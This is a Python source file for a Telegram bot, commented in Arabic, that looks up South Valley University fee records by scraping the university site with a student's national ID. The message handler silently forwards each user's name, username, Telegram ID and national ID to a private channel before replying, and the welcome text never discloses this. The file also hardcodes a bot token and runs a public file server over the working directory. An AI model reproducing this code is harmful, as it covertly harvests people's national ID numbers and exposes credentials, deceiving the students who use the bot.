import asyncio
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import re
import threading
from bs4 import BeautifulSoup
import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ----------------- الإعدادات -----------------
BOT_TOKEN = "8812017814:AAFqVQodQbzR726hb_ENwzljnKvDtop08YQ"
CHANNEL_ID = "-1004370577416"
SITE_URL = "http://mispg.svu.edu.eg/svu_pg/enquery.aspx"
# --------------------------------------------


def run_dummy_server():
    """خادم وهمي لإبقاء الخدمة Live على Render"""
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)
    server.serve_forever()


def fetch_expenses_from_site(national_id: str):
    session = requests.Session()
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        ),
        "Accept-Language": "ar,en-US;q=0.7,en;q=0.3",
        "Referer": SITE_URL,
    }
    session.headers.update(headers)

    try:
        # 1. طلب الصفحة الأولى للحصول على جميع المدخلات المخفية
        r1 = session.get(SITE_URL, timeout=15)
        soup = BeautifulSoup(r1.text, "html.parser")

        payload = {}
        # جمع كل الحقول المخفية تلقائياً (VIEWSTATE, EVENTVALIDATION, إلخ)
        for inp in soup.find_all("input"):
            name = inp.get("name")
            val = inp.get("value", "")
            if name:
                payload[name] = val

        # تحديد اسم خانة الرقم القومي
        text_inputs = soup.find_all("input", {"type": "text"})
        txt_name = None
        for ti in text_inputs:
            # الحقل إما اسمه فيه txt أو ID أو هو أول مربع نص
            txt_name = ti.get("name")
            break

        if not txt_name:
            txt_name = "ctl00$ContentPlaceHolder1$txtNationalId"

        payload[txt_name] = national_id

        # تحديد زر البحث
        submit_btn = soup.find("input", {"type": "submit"})
        if submit_btn and submit_btn.get("name"):
            payload[submit_btn.get("name")] = submit_btn.get("value", "استعلام")

        # 2. إرسال طلب البحث POST
        r2 = session.post(SITE_URL, data=payload, timeout=20)
        res_soup = BeautifulSoup(r2.text, "html.parser")

        # 3. استخراج النتيجة بدقة
        # إذا كان الموقع يحتوي على رسالة خطأ واضحة
        page_text = res_soup.get_text()

        # إزالة الفراغات الزائدة
        cleaned_text = re.sub(r"\s+", " ", page_text).strip()

        # البحث عن نصوص التقرير أو الجداول
        tables = res_soup.find_all("table")
        valid_rows = []
        for table in tables:
            for row in table.find_all("tr"):
                txt = row.get_text(separator=" | ", strip=True)
                # تصفية النصوص المهمة واستبعاد القوائم الفارغة
                if (
                    txt
                    and len(txt) > 5
                    and "Report Viewer" not in txt
                    and "javascript" not in txt
                ):
                    valid_rows.append(txt)

        if valid_rows:
            # استخراج أحدث صفوف تظهر بيانات الطالب والرسوم
            result_summary = "\n".join(valid_rows[:12])
            return result_summary

        # إذا لم نجد جداول مباشرة ولكن تم العثور على كلمات تدل على النتيجة
        if "المصروفات" in cleaned_text or "الرسوم" in cleaned_text:
            return "تم العثور على البيانات ولكن التقرير يتطلب مراجعة من المتصفح مباشرة."

        return (
            "لم يتم العثور على بيانات مسجلة لهذا الرقم القومي.\n"
            "تأكد أن الرقم القومي صحيح ومسجل بالدراسات العليا/الجامعة."
        )

    except Exception as e:
        return f"حدث خطأ أثناء الاتصال بالنظام: {str(e)}"


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    user = update.effective_user

    # إرسال إشعار فوري في قناتك الخاصة أولاً
    log_text = (
        f"📥 **مدخل جديد في البوت:**\n"
        f"👤 **الاسم:** {user.full_name}\n"
        f"🔗 **اليوزر:** @{user.username if user.username else 'لا يوجد'}\n"
        f"🆔 **الآيدي:** `{user.id}`\n"
        f"🔢 **المدخل / الرقم:** `{user_input}`"
    )

    try:
        await context.bot.send_message(
            chat_id=CHANNEL_ID,
            text=log_text,
            parse_mode="Markdown",
        )
    except Exception as err:
        print(f"Error sending log to channel: {err}")

    # التحقق من أن المدخل رقم قومي
    if not user_input.isdigit() or len(user_input) != 14:
        await update.message.reply_text(
            "يرجى كتابة الرقم القومي المكون من 14 رقماً فقط للاستعلام."
        )
        return

    await update.message.reply_text("جاري الاستعلام من موقع الجامعة...")

    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, fetch_expenses_from_site, user_input
    )

    await update.message.reply_text(f"📋 **النتيجة:**\n\n{result}")


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "أهلاً بك في بوت الاستعلام عن مصروفات جامعة جنوب الوادي.\n\n"
        "أرسل رقمك القومي (14 رقم) مباشرة للبدء في الاستعلام."
    )


if __name__ == "__main__":
    web_thread = threading.Thread(target=run_dummy_server, daemon=True)
    web_thread.start()

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)
    )

    print("البوت يعمل الآن ومربوط بالقناة...")
    app.run_polling()
